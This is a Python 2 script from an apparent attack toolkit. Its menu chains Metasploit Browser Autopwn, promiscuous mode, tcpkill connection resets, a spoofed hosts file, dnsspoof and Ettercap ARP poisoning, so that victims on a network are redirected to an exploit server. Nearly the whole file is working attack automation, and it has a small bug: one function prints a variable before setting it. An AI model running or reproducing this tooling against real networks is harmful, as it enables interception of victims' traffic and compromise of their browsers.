#!/usr/bin/env python
# coding=UTF-8

#The first line allows this script to be executable

import os
import socket
import operator
# from termcolor import colored
import sys
sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=64, cols=200)) # sets window to full screen

def msf_browser_autopwn(): # this should be opening in a new window so that the user can go back to main menu and do the other steps
    print '[!] Warning as of April 14th 2017, the Browser Autopwn Module appears to be bugged'
    print '[!] The only exploits that launch are Java-based, and attempting to isolate Java from the exploit server causes no exploits to  launch on vulnerable targets'
    os.system('chmod 777 /root/ArmsCommander/wirelessattacks/Cylon-Raider/DNSSpoofing/*')
    print '[+] Starting the Browser Autopwn Module for Metasploit'
    # os.system('/root/ArmsCommander/wirelessattacks/Cylon-Raider/DNSSpoofing/StartMetasploitWithHandler.sh')
    os.system("gnome-terminal -e 'bash -c \"/root/ArmsCommander/wirelessattacks/Cylon-Raider/DNSSpoofing/StartMetasploitWithHandler.sh; exec bash\"'")
    print '[*] To continue go back and use the next components in the DNS Spoofing Menu'
    main()
    return

def set_promiscuous():
    network_interface = str(raw_input("Enter your network interface: "))

    cmd_String = "ifconfig %s promisc" % network_interface
    print cmd_String
    os.system(cmd_String)
    print '[*] Network interface %s set to promiscuous mode' % network_interface
    main()
    return

def TCP_kill():
    kill_target = str(raw_input("Enter a IP address or webhost you want to kill connection to: "))
    print cmd_String
    cmd_String = "tcpkill -i host %s" % kill_target
    print '[+] Killing connections to %s' %kill_target
    os.system(cmd_String)
    main()
    return

def edit_hostsfile():
    edit_question = str(raw_input("Type CONTINUE to continue editing the hosts file or ANY key to go back: "))
    if edit_question == "CONTINUE":
        cmd_String = "nano /root/ArmsCommander/wirelessattacks/Cylon-Raider/DNSSpoofing/hosts"
        print cmd_String
        os.system(cmd_String)
    else:
        main()
    main()
    return

def run_DNSSpoof(): # should be opened in a new window
    network_interface = str(raw_input("Enter your network interface: "))
    hostsfile_location = "/root/ArmsCommander/wirelessattacks/Cylon-Raider/DNSSpoofing/hosts"
    # The DNS spoofing worked at one point "somewhat"
    # Not exactly sure why
    # But it says online that Ettercap is required as a MITM proxy because otherwise DNSSpoof is far too slow to fake the request

    # Restart apache 2 webserver if running
    cmd_String = "service apache2 restart"
    os.system(cmd_String)
    print cmd_String
    # hostsfile_location = "/usr/share/dsniff/dnsspoof.hosts"
    cmd_String = "dnsspoof -i %s -f %s" % (network_interface, hostsfile_location)
    # os.system("gnome-terminal -e 'bash -c \"%s; exec bash\"'") % cmd_String
    print cmd_String
    os.system(cmd_String)
    main()
    return

def ettercap():
    print 'Select UNIFIED SNIFFING in [Targets]'
    print 'Select SCAN HOSTS in [Hosts]'
    print 'Select GATEWAY in discovered hosts and set as [Target 2]'
    print 'Select ARP poisoning in [MITM], and use Remote Mode'
    print 'Select Manage the Plugins from [Plugins]'
    print 'dns_spoof in [Manage the Plugins]'
    os.system("gnome-terminal -e 'bash -c \"ettercap -G; exec bash\"'")

    return
def main():
    opt_List = [
        '\n\t#1. Start the Metasploit Browser-Autopwn Proxy Server(and listeners)',
        '#2. Set your network interface into promiscuous mode',
        '#3. Use TCP Kill to kill a connection with a client/server and force them to reconnect back to us',
        '#4. Make/Edit the temporary Hosts file that is being used to send victims to Proxy Server',
        '#5. Run DNS Spoof',
        '#6. Run Ettercap as a MITM service to allow DNS Spoof to respond to requests in time'
    ]

    print ("\n\t".join(opt_List))
    opt_Choice = str(raw_input("Enter a OPTION: "))

    if opt_Choice == "1":
        os.system('clear')
        msf_browser_autopwn()
    elif opt_Choice == "2":
        os.system('clear')
        set_promiscuous()
    elif opt_Choice == "3":
        os.system('clear')
        TCP_kill()
    elif opt_Choice == "4":
        os.system('clear')
        edit_hostsfile()
    elif opt_Choice == "5":
        os.system('clear')
        run_DNSSpoof()
    elif opt_Choice == "6":
        os.system('clear')
        ettercap()
    else:
        print 'You have entered a invalid option'
        main()
    return

main()
